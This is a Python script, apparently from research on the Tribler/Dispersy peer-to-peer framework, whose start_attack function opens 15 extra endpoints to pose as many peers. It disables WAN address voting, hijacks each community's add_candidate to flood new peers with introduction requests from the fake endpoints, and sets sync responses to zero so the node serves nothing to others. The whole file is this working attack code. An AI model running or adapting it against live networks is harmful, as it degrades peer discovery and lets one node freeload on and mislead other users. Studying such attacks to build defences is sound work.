import sys
from Tribler.dispersy.endpoint import StandaloneEndpoint
from Tribler.dispersy.candidate import BootstrapCandidate

def send_requests(community, candidate, endpoints):
    for lan_port, endpoint in endpoints:
        community.dispersy._endpoint = endpoint
        community.dispersy._lan_address = (community.dispersy._lan_address[0], lan_port)
        community.create_introduction_request(candidate, False)

        yield 1.0

def connect(dispersy, endpoints, nr_endpoints):
    for _ in range(1, nr_endpoints):
        endpoint = StandaloneEndpoint(endpoints[-1][0] + 1)
        endpoint.open(dispersy)

        endpoints.append((endpoint._port, endpoint))

def disconnect(endpoints):
    for _, endpoint in endpoints:
        endpoint.close()

def start_attack(dispersy):
    nr_endpoints = 15

    # step 1, start creating some endpoints
    endpoints = [(dispersy.lan_address[1], dispersy.endpoint)]
    connect(dispersy, endpoints, nr_endpoints)

    # step 2, replace wan_address_vote method
    dispersy.wan_address_vote = lambda address, voter: None

    # step 3, wrap add_candidate method for current communities
    def add_candidate(community, candidate):
        if not isinstance(candidate, BootstrapCandidate):
            if candidate.sock_addr not in community._candidates:
                community.old_add_candidate(candidate)

                dispersy.callback.register(send_requests, (community, candidate, endpoints))

    for community in dispersy.get_communities():
        community.old_add_candidate = community.add_candidate
        community.add_candidate = lambda candidate, community = community: add_candidate(community, candidate)
        community.dispersy_sync_response_limit = lambda : 0

    # step 4, schedule disconnect
    dispersy.callback.register(disconnect, (endpoints,), delay=300.0)
